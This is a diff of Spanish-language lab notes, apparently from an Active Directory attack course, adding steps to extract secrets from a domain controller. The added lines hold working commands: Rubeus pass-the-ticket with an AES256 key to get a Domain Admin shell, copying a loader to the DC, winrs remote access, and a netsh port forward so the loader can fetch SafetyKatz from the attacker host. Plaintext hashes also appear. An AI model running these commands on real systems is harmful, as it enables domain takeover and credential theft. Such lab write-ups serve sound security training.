@@ -768,11 +768,34 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sek
 Obteniendo al credencial del usuario *appadmin -> 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb*
 
 *LO - 08*
-### Estraer secrets del Domain Controller
+### Extraer secrets del Domain Controller
 Primero deberemos de ejecutar un proceso con privilegios de Domain Admin, para ello ejecutaremos una CMD con privilegios elevados
 ```shell
 [student97]
 runas /user:dcorp\student97 /netonly cmd
 ```
 
-Y extraeremos los 
+Y extraeremos los secrets usando *SafetyKatz*, tendremos que pasar el usuario y el hash de *appadmin*
+```shell
+[newShell as student97 privileges]
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+Se nos ejecutara a continuacion un proceso CMD como *Domain Admin*
+Copiaremos el *Loader* al *dcorp-dc*
+```shell
+[newShell as Domain Admin privileges]
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+
+Una vez copiado nos conectaremos al *dcorp-dc* usando *winrs*
+```shell
+[newShell as Domain Admin privileges]
+winrs -r:dcorp-dc cmd
+```
+
+Una vez conectados haremos un reenvio de puertos hacia nuestra maquina de atacante
+```shell
+[newShell as Doamin Admin privileges]
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
+```
